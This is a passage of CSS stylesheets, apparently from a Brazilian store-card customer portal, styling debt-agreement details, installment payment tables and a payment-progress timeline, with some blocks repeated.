         display: flex;
         position: relative;
         -webkit-box-pack: justify;
         justify-content: space-between;
         list-style: none; }
         @media (min-width: 1024px) {
         .lista-evolucao-pagamento .evolucao-pagamento-item:first-child .detalhe-pagamento {
         left: -30px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item:first-child .detalhe-pagamento:after {
         left: 20%; }
         .lista-evolucao-pagamento .evolucao-pagamento-item:last-child .detalhe-pagamento {
         left: -142px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item:last-child .detalhe-pagamento:after {
         left: 68%; }
         .lista-evolucao-pagamento .evolucao-pagamento-item {
         width: 50px; } }
         .lista-evolucao-pagamento:before {
         position: absolute;
         top: 14px;
         right: 28px;
         left: 28px;
         border-top: 1px dashed #acacac;
         content: ""; }
         .ie .lista-evolucao-pagamento {
         margin-left: -40px; }
         .ie .lista-evolucao-pagamento:before {
         left: 56px; }
         .ie .lista-evolucao-pagamento .evolucao-pagamento-item {
         width: 50px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item {
         text-align: center; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento {
         display: -webkit-box;
         display: flex;
         position: relative;
         top: 20px;
         left: -86px;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         border-radius: 3px;
         background: #ebebeb;
         width: 232px;
         height: 41px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento:after {
         display: block;
         position: absolute;
         top: -46%;
         bottom: auto;
         left: 44%;
         border: solid 0.6rem;
         border-bottom-style: solid;
         border-color: transparent transparent #ebebeb;
         width: 0;
         height: 0;
         content: ""; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento {
         font-size: 12px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__label {
         color: #acacac;
         font-weight: 700; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-pago {
         color: #3ecf7a;
         font-size: 14px;
         font-weight: 700; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-total {
         color: #706f6f;
         font-size: 14px;
         font-weight: 700; }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         background-color: #3ecf7a; }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:before, .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:after {
         display: block;
         background-color: #fff;
         height: 3px;
         content: ""; }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:before {
         -webkit-transform: rotate(45deg) translateX(2px);
         transform: rotate(45deg) translateX(2px);
         width: 7px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:after {
         -webkit-transform: rotate(-45deg);
         transform: rotate(-45deg);
         margin-left: -2px;
         width: 10px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .evolucao-pagamento-item__icone {
         display: block;
         position: relative;
         margin: 0 auto 5px;
         border: 2px solid #fff;
         background-color: #e0e0e0;
         border-radius: 50%;
         width: 28px;
         height: 28px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .evolucao-pagamento-item__parcela {
         margin: 0;
         color: #706f6f;
         font-size: 10px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .evolucao-pagamento-item__parcela .evolucao-pagamento-item__parcela-numero {
         display: block;
         line-height: 100%;
         font-size: 12px;
         font-weight: 700; }
         @media (max-width: 1023px) {
         .toggle-evolucao-pagamento {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         border: 1px solid #e0e0e0;
         border-top: 0;
         padding: 5px 22px 5px 10px; }
         .toggle-evolucao-pagamento:after {
         display: block;
         position: absolute;
         right: 20px;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         border-right: 1px solid #706f6f;
         border-bottom: 1px solid #706f6f;
         width: 10px;
         height: 10px;
         content: ""; }
         .toggle-evolucao-pagamento .info-acordo .info-acordo__label {
         display: block;
         text-align: left;
         line-height: 1;
         font-size: 10px; }
         .toggle-evolucao-pagamento .info-pagamento {
         margin-right: 35px; }
         .toggle-evolucao-pagamento .info-pagamento .info-pagamento__label {
         display: block;
         margin-top: 5px;
         text-align: right;
         line-height: 0.5;
         color: #acacac;
         font-size: 10px; }
         .toggle-evolucao-pagamento .info-pagamento .info-pagamento__valor {
         font-size: 12px; }
         .toggle-evolucao-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-pago {
         color: #3ecf7a;
         font-size: 14px;
         font-weight: 700; }
         .toggle-evolucao-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-total {
         color: #706f6f;
         font-size: 14px;
         font-weight: 700; }
         .toggle-ativo {
         background: transparent; }
         .toggle-ativo:after {
         -webkit-transform: rotate(225deg);
         transform: rotate(225deg); }
         .container-desativado {
         display: none; }
         .container-evolucao-pagamento {
         border: 1px solid #e0e0e0;
         border-top: none;
         padding: 0 20px; }
         .lista-evolucao-pagamento {
         -webkit-box-align: start;
         align-items: flex-start;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin-top: 0;
         margin-bottom: 0; }
         .lista-evolucao-pagamento:before {
         display: block;
         position: absolute;
         top: 30px;
         right: auto;
         bottom: 30px;
         left: 14px;
         border-left: 1px dashed #bdbdbd;
         height: auto;
         content: ""; }
         .lista-evolucao-pagamento .evolucao-pagamento-item {
         display: -webkit-box;
         display: flex;
         margin: 17px 0; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento {
         top: -10px;
         left: 10%;
         -webkit-box-align: start;
         align-items: flex-start;
         padding: 0 10px;
         width: 153px;
         height: 53px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento:after {
         top: 30%;
         bottom: auto;
         left: -13%;
         border-right-style: solid;
         border-color: transparent #ebebeb transparent transparent;
         content: ""; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__label {
         display: block;
         margin-top: 13px;
         text-align: left;
         line-height: 0.5;
         color: #bdbdbd; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__valor {
         display: block;
         margin-top: 5px;
         text-align: left;
         font-size: 12px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-pago {
         font-size: 12px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-total {
         font-size: 12px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:before {
         -webkit-transform: rotate(45deg) translateX(1px);
         transform: rotate(45deg) translateX(1px); }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:after {
         margin-left: -4px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .evolucao-pagamento-item__icone {
         margin-right: 15px; } }
         .block__header .block__header-title .evolucao-pagamento-title {
         display: inline-block; }
         .info-acordo {
         float: right;
         font-size: 12px; }
         .info-acordo .info-acordo__label {
         padding-right: 5px;
         color: #706f6f; }
         .info-acordo .info-acordo__valor {
         color: #1e1e1f; }
         .evolucao-pagamento:first-child .panel__cell {
         border-radius: 3px 3px 0 0; }
         .evolucao-pagamento:last-child .panel__cell {
         border-radius: 0 0 3px 3px; }
         .evolucao-pagamento:not(:first-child) .panel__cell .block__header-icon,
         .evolucao-pagamento:not(:first-child) .panel__cell .block__header-text {
         visibility: hidden; }
         .evolucao-pagamento:not(:last-child) .panel__cell {
         margin-bottom: 0;
         border-bottom: 0;
         border-radius: 0; }
         @media (max-width: 1023px) {
         .evolucao-pagamento .block__header {
         display: none; }
         .evolucao-pagamento:first-child .block__header {
         display: inline-block; }
         .evolucao-pagamento:first-child .toggle-evolucao-pagamento {
         border-top: 1px solid #e0e0e0; }
         .evolucao-pagamento .panel__cell {
         border: none;
         padding: 0; }
         .evolucao-pagamento .panel__cell .block__header {
         margin-top: 7px; }
         .evolucao-pagamento .panel__cell .block__header .block__header-title .block__header-text {
         padding-left: 25px; }
         .evolucao-pagamento .panel__cell .block__header .block__header-title .block__header-icon {
         width: 18px;
         height: 18px; } }
      </style>
      <style type="text/css">.lista-evolucao-pagamento {
         display: -webkit-box;
         display: flex;
         position: relative;
         -webkit-box-pack: justify;
         justify-content: space-between;
         list-style: none; }
         @media (min-width: 1024px) {
         .lista-evolucao-pagamento .evolucao-pagamento-item:first-child .detalhe-pagamento {
         left: -30px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item:first-child .detalhe-pagamento:after {
         left: 20%; }
         .lista-evolucao-pagamento .evolucao-pagamento-item:last-child .detalhe-pagamento {
         left: -142px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item:last-child .detalhe-pagamento:after {
         left: 68%; }
         .lista-evolucao-pagamento .evolucao-pagamento-item {
         width: 50px; } }
         .lista-evolucao-pagamento:before {
         position: absolute;
         top: 14px;
         right: 28px;
         left: 28px;
         border-top: 1px dashed #acacac;
         content: ""; }
         .ie .lista-evolucao-pagamento {
         margin-left: -40px; }
         .ie .lista-evolucao-pagamento:before {
         left: 56px; }
         .ie .lista-evolucao-pagamento .evolucao-pagamento-item {
         width: 50px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item {
         text-align: center; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento {
         display: -webkit-box;
         display: flex;
         position: relative;
         top: 20px;
         left: -86px;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         border-radius: 3px;
         background: #ebebeb;
         width: 232px;
         height: 41px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento:after {
         display: block;
         position: absolute;
         top: -46%;
         bottom: auto;
         left: 44%;
         border: solid 0.6rem;
         border-bottom-style: solid;
         border-color: transparent transparent #ebebeb;
         width: 0;
         height: 0;
         content: ""; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento {
         font-size: 12px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__label {
         color: #acacac;
         font-weight: 700; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-pago {
         color: #3ecf7a;
         font-size: 14px;
         font-weight: 700; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-total {
         color: #706f6f;
         font-size: 14px;
         font-weight: 700; }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         background-color: #3ecf7a; }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:before, .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:after {
         display: block;
         background-color: #fff;
         height: 3px;
         content: ""; }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:before {
         -webkit-transform: rotate(45deg) translateX(2px);
         transform: rotate(45deg) translateX(2px);
         width: 7px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:after {
         -webkit-transform: rotate(-45deg);
         transform: rotate(-45deg);
         margin-left: -2px;
         width: 10px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .evolucao-pagamento-item__icone {
         display: block;
         position: relative;
         margin: 0 auto 5px;
         border: 2px solid #fff;
         background-color: #e0e0e0;
         border-radius: 50%;
         width: 28px;
         height: 28px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .evolucao-pagamento-item__parcela {
         margin: 0;
         color: #706f6f;
         font-size: 10px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .evolucao-pagamento-item__parcela .evolucao-pagamento-item__parcela-numero {
         display: block;
         line-height: 100%;
         font-size: 12px;
         font-weight: 700; }
         @media (max-width: 1023px) {
         .toggle-evolucao-pagamento {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         border: 1px solid #e0e0e0;
         border-top: 0;
         padding: 5px 22px 5px 10px; }
         .toggle-evolucao-pagamento:after {
         display: block;
         position: absolute;
         right: 20px;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         border-right: 1px solid #706f6f;
         border-bottom: 1px solid #706f6f;
         width: 10px;
         height: 10px;
         content: ""; }
         .toggle-evolucao-pagamento .info-acordo .info-acordo__label {
         display: block;
         text-align: left;
         line-height: 1;
         font-size: 10px; }
         .toggle-evolucao-pagamento .info-pagamento {
         margin-right: 35px; }
         .toggle-evolucao-pagamento .info-pagamento .info-pagamento__label {
         display: block;
         margin-top: 5px;
         text-align: right;
         line-height: 0.5;
         color: #acacac;
         font-size: 10px; }
         .toggle-evolucao-pagamento .info-pagamento .info-pagamento__valor {
         font-size: 12px; }
         .toggle-evolucao-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-pago {
         color: #3ecf7a;
         font-size: 14px;
         font-weight: 700; }
         .toggle-evolucao-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-total {
         color: #706f6f;
         font-size: 14px;
         font-weight: 700; }
         .toggle-ativo {
         background: transparent; }
         .toggle-ativo:after {
         -webkit-transform: rotate(225deg);
         transform: rotate(225deg); }
         .container-desativado {
         display: none; }
         .container-evolucao-pagamento {
         border: 1px solid #e0e0e0;
         border-top: none;
         padding: 0 20px; }
         .lista-evolucao-pagamento {
         -webkit-box-align: start;
         align-items: flex-start;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin-top: 0;
         margin-bottom: 0; }
         .lista-evolucao-pagamento:before {
         display: block;
         position: absolute;
         top: 30px;
         right: auto;
         bottom: 30px;
         left: 14px;
         border-left: 1px dashed #bdbdbd;
         height: auto;
         content: ""; }
         .lista-evolucao-pagamento .evolucao-pagamento-item {
         display: -webkit-box;
         display: flex;
         margin: 17px 0; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento {
         top: -10px;
         left: 10%;
         -webkit-box-align: start;
         align-items: flex-start;
         padding: 0 10px;
         width: 153px;
         height: 53px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento:after {
         top: 30%;
         bottom: auto;
         left: -13%;
         border-right-style: solid;
         border-color: transparent #ebebeb transparent transparent;
         content: ""; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__label {
         display: block;
         margin-top: 13px;
         text-align: left;
         line-height: 0.5;
         color: #bdbdbd; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__valor {
         display: block;
         margin-top: 5px;
         text-align: left;
         font-size: 12px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-pago {
         font-size: 12px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .detalhe-pagamento .info-pagamento .info-pagamento__valor .info-pagamento__valor-total {
         font-size: 12px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:before {
         -webkit-transform: rotate(45deg) translateX(1px);
         transform: rotate(45deg) translateX(1px); }
         .lista-evolucao-pagamento .evolucao-pagamento-item.evolucao-pagamento-item--pago .evolucao-pagamento-item__icone:after {
         margin-left: -4px; }
         .lista-evolucao-pagamento .evolucao-pagamento-item .evolucao-pagamento-item__icone {
         margin-right: 15px; } }
      </style>
      <style type="text/css">.detalhe-acordo .origem-divida {
         border-top: none;
         border-right: none;
         border-left: none; }
         .detalhe-acordo .detalhe-acordo__header .detalhe-acordo__header-title {
         font-size: 22px;
         font-weight: 300; }
         .detalhe-acordo .detalhe-acordo__header .detalhe-acordo__header-subtitle {
         font-size: 16px;
         font-weight: 300; }
         .detalhe-acordo .detalhe-acordo__content {
         margin: 0; }
         .detalhe-acordo .detalhe-acordo__content .column {
         padding: 0; }
         .detalhe-acordo .detalhe-acordo__acordo,
         .detalhe-acordo .detalhe-acordo__parcela {
         border: 1px solid #e0e0e0; }
         .detalhe-acordo .detalhe-acordo__parcela-detalhamento,
         .detalhe-acordo .detalhe-acordo__parcela-total {
         border-top: 1px solid #e0e0e0; }
         .detalhe-acordo .detalhe-acordo__parcela {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .detalhe-acordo .detalhe-acordo__parcela > div {
         padding: 15px 20px; }
         .detalhe-acordo .detalhe-acordo__parcela .detalhe-acordo__parcela-boleto {
         padding-top: 0; }
         .detalhe-acordo .detalhe-acordo__parcela .detalhe-acordo__parcela-total-label {
         font-size: 14px; }
         .detalhe-acordo .detalhe-acordo__parcela-detalhamento {
         background-color: #f2f2f2;
         font-size: 14px; }
         .detalhe-acordo .detalhe-acordo__acordo {
         margin-left: 15px;
         padding: 20px; }
         .detalhe-acordo .detalhe-acordo__acordo .detalhe-acordo__acordo-details > li {
         display: -webkit-box;
         display: flex;
         margin-bottom: 15px; }
         .detalhe-acordo .detalhe-acordo__acordo .detalhe-acordo__acordo-details > li:last-of-type {
         margin-bottom: 0; }
         .detalhe-acordo .detalhe-acordo__acordo .detalhe-acordo__acordo-details > li > * {
         width: 50%; }
         .detalhe-acordo .detalhe-acordo__field {
         display: block;
         text-transform: uppercase;
         color: #706f6f;
         font-size: 12px; }
         .detalhe-acordo .detalhe-acordo__footer {
         margin-top: 20px; }
         .detalhe-acordo .detalhe-acordo__text--alert {
         color: #cf3e3e; }
         .detalhe-acordo ul {
         margin: 0;
         list-style: none; }
         @media (max-width: 1023px) {
         .detalhe-acordo .detalhe-acordo__acordo {
         margin-top: 20px;
         margin-left: 0; } }
         @media (max-width: 767px) {
         .detalhe-acordo .detalhe-acordo__footer .button {
         width: 100%; } }
      </style>
      <style type="text/css">.acordo-row {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         padding: 15px 0; }
         .acordo-row p {
         margin: 0; }
         .acordo-row .valor-parcela {
         color: #1e1e1f; }
         .acordo-row .grupo {
         -webkit-box-flex: 1;
         flex: 1; }
         .acordo-row .grupo .wrapper {
         display: -webkit-box;
         display: flex; }
         .acordo-row .grupo .wrapper.icon-codigo {
         -webkit-box-align: center;
         align-items: center; }
         .acordo-row .grupo .wrapper.icon-codigo i {
         margin-right: 5px; }
         .acordo-row .grupo .wrapper .atraso-status {
         margin-left: 5px;
         color: #cf3e3e; }
         .acordo-row .grupo .wrapper .processando-status {
         margin-left: 5px; }
         .acordo-row .grupo p {
         font-size: 14px; }
         .acordo-row .grupo .valor-parcela {
         font-size: 16px;
         font-weight: 700; }
         .acordo-row .grupo .secundario {
         color: #706f6f; }
         .acordo-row .grupo:not(:first-child) {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: end;
         align-items: flex-end;
         -webkit-box-flex: unset;
         flex: unset;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: center;
         justify-content: center;
         width: -webkit-fit-content;
         width: -moz-fit-content;
         width: fit-content; }
         .acordo-row .loader {
         margin-left: 15px; }
         .acordo-row .button {
         padding: 0;
         width: 75px;
         height: 40px;
         text-align: center;
         line-height: 40px; }
      </style>
      <style type="text/css">table.table-parcelas-acordo {
         border-collapse: collapse; }
         table.table-parcelas-acordo .status-acordo {
         display: none; }
         table.table-parcelas-acordo tr.em-atraso td.valor-parcela {
         color: #cf3e3e; }
         table.table-parcelas-acordo tr.em-atraso td.valor-parcela .status-acordo {
         display: inline;
         margin-left: 12px; }
         table.table-parcelas-acordo tr:not(:first-child):hover {
         cursor: pointer; }
         table.table-parcelas-acordo tr:not(.pagavel) .status-acordo {
         display: none; }
         table.table-parcelas-acordo tr:not(.pagavel) .loader {
         visibility: hidden; }
         table.table-parcelas-acordo th {
         height: 50px;
         text-align: left;
         color: #706f6f;
         font-weight: normal; }
         table.table-parcelas-acordo td {
         border-top: 1px solid #e0e0e0;
         width: 23%;
         height: 60px;
         color: #706f6f;
         font-size: 14px; }
         table.table-parcelas-acordo td.valor-parcela {
         width: 100%;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 700; }
         table.table-parcelas-acordo td.gerar {
         width: 140px; }
         table.table-parcelas-acordo td.codigo {
         color: #1e1e1f; }
         table.table-parcelas-acordo .button {
         width: 140px;
         height: 40px;
         line-height: 38px; }
         .lista-parcelas-acordo {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: center;
         justify-content: center;
         border: 1px solid #e0e0e0;
         padding: 20px 20px 0; }
         @media (max-width: 767px) {
         .lista-parcelas-acordo {
         border: none;
         padding: 15px 5px 0; } }
         .lista-parcelas-acordo--header {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-bottom: 10px;
         width: 100%; }
         @media (min-width: 1024px) {
         .lista-parcelas-acordo--header {
         margin-bottom: 15px; } }
         @media (max-width: 1023px) {
         .lista-parcelas-acordo--header {
         -webkit-box-align: start;
         align-items: flex-start;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .lista-parcelas-acordo--header .aviso-atraso {
         margin-top: 10px;
         border-top: 1px solid #e0e0e0;
         padding-top: 10px; } }
         .lista-parcelas-acordo--header .titulo {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .lista-parcelas-acordo--header .titulo h3 {
         margin: 0;
         font-size: 16px;
         font-weight: normal; }
         @media (min-width: 768px) {
         .lista-parcelas-acordo--header .titulo h3 {
         font-size: 20px; } }
         .lista-parcelas-acordo--header .titulo .icon {
         margin-right: 10px;
         width: 18px;
         height: 18px; }
         @media (min-width: 768px) {
         .lista-parcelas-acordo--header .titulo .icon {
         width: 26px;
         height: 26px; } }
         .lista-parcelas-acordo--header .aviso-atraso {
         color: #cf3e3e;
         font-size: 12px; }
         @media (max-width: 1023px) {
         .lista-parcelas-acordo--header .aviso-atraso {
         width: 100%;
         text-align: left; } }
         @media (min-width: 768px) {
         .lista-parcelas-acordo--header .aviso-atraso {
         font-size: 14px; } }
         .lista-parcelas-acordo .button-parcelas {
         margin-top: 15px;
         margin-bottom: 20px;
         height: 45px;
         line-height: 42px;
         font-size: 16px; }
         @media (min-width: 1024px) and (max-width: 1199px) {
         .lista-parcelas-acordo .button-parcelas {
         margin-top: 30px; } }
         .lista-parcelas-acordo .pagavel .valor-parcela.atraso {
         color: #cf3e3e; }
         .lista-parcelas-acordo .lista-parcela-acordo-row {
         width: 100%; }
         .lista-parcelas-acordo .lista-parcela-acordo-row .acordo-row {
         border-top: 1px solid #e0e0e0;
         width: 100%; }
         .lista-parcelas-acordo .lista-parcela-acordo-row .acordo-row .atraso-status {
         display: none; }
         .lista-parcelas-acordo .lista-parcela-acordo-row .acordo-row:not(.pagavel) .loader {
         visibility: hidden; }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .cartao-renner .resumo-acordos:after,
         .meu-cartao .cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .resumo-acordos:after {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .cartao-renner .resumo-acordos:after,
         .cartao-renner .resumo-acordos--header,
         .meu-cartao .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .resumo-acordos:after,
         .meu-cartao .cartao-renner .resumo-acordos--header {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed,
         .cartao-renner.theme-priority .resumo-acordos:after {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed,
         .cartao-renner.theme-priority .resumo-acordos:after,
         .cartao-renner.theme-priority .resumo-acordos--header {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed,
         .meu-cartao .resumo-acordos:after,
         .cartao-renner .meu-cartao .resumo-acordos:after {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .meu-cartao .resumo-acordos:after,
         .meu-cartao .resumo-acordos--header,
         .cartao-renner .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .resumo-acordos:after,
         .cartao-renner .meu-cartao .resumo-acordos--header {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed,
         .meu-cartao.theme-priority .resumo-acordos:after {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed,
         .meu-cartao.theme-priority .resumo-acordos:after,
         .meu-cartao.theme-priority .resumo-acordos--header {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         table.table-parcelas-acordo {
         border-collapse: collapse; }
         table.table-parcelas-acordo .status-acordo {
         display: none; }
         table.table-parcelas-acordo tr.em-atraso td.valor-parcela {
         color: #cf3e3e; }
         table.table-parcelas-acordo tr.em-atraso td.valor-parcela .status-acordo {
         display: inline;
         margin-left: 12px; }
         table.table-parcelas-acordo tr:not(:first-child):hover {
         cursor: pointer; }
         table.table-parcelas-acordo tr:not(.pagavel) .status-acordo {
         display: none; }
         table.table-parcelas-acordo tr:not(.pagavel) .loader {
         visibility: hidden; }
         table.table-parcelas-acordo th {
         height: 50px;
         text-align: left;
         color: #706f6f;
         font-weight: normal; }
         table.table-parcelas-acordo td {
         border-top: 1px solid #e0e0e0;
         width: 23%;
         height: 60px;
         color: #706f6f;
         font-size: 14px; }
         table.table-parcelas-acordo td.valor-parcela {
         width: 100%;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 700; }
         table.table-parcelas-acordo td.gerar {
         width: 140px; }
         table.table-parcelas-acordo td.codigo {
         color: #1e1e1f; }
         table.table-parcelas-acordo .button {
         width: 140px;
         height: 40px;
         line-height: 38px; }
         .resumo-acordos {
         position: relative;
         margin-top: 20px;
         margin-bottom: 30px;
         border: 1px solid #e0e0e0;
         border-bottom-left-radius: 5px;
         border-bottom-right-radius: 5px;
         padding-top: 13px; }
         @media (max-width: 767px) {
         .resumo-acordos {
         padding-top: 8px; } }
         @media (max-width: 767px) {
         .resumo-acordos:after {
         box-sizing: content-box;
         position: absolute;
         top: -8px;
         left: -1px;
         border: 1px solid grey;
         width: 100%;
         height: 8px;
         content: ""; } }
         .resumo-acordos .atraso {
         color: #cf3e3e; }
         .resumo-acordos h3,
         .resumo-acordos p {
         margin: 0; }
         .resumo-acordos--warning, .resumo-acordos--content {
         margin: 0 10px; }
         @media (min-width: 768px) {
         .resumo-acordos--warning, .resumo-acordos--content {
         margin: 0 20px; } }
         .resumo-acordos--header, .resumo-acordos--warning {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         border-bottom: 1px solid #e0e0e0;
         padding-bottom: 15px; }
         @media (max-width: 767px) {
         .resumo-acordos--header, .resumo-acordos--warning {
         padding-bottom: 8px; } }
         .resumo-acordos--warning {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         padding-top: 15px;
         color: #706f6f;
         font-size: 12px; }
         @media (min-width: 768px) {
         .resumo-acordos--warning {
         font-size: 14px; } }
         @media (max-width: 767px) {
         .resumo-acordos--warning {
         border-top: 1px solid #e0e0e0;
         padding-top: 8px; } }
         .resumo-acordos--warning .text-qntd-mostrando {
         color: #1e1e1f;
         font-size: 12px; }
         @media (min-width: 768px) {
         .resumo-acordos--warning .text-qntd-mostrando {
         font-size: 14px; } }
         .resumo-acordos--warning .countdown {
         display: -webkit-box;
         display: flex; }
         @media (max-width: 767px) {
         .resumo-acordos--warning .countdown {
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         width: 100%; }
         .resumo-acordos--warning .countdown .circular-chart {
         margin-left: 20px; } }
         .resumo-acordos--warning .circular-chart {
         margin-left: 5px; }
         .resumo-acordos--warning .circular-chart,
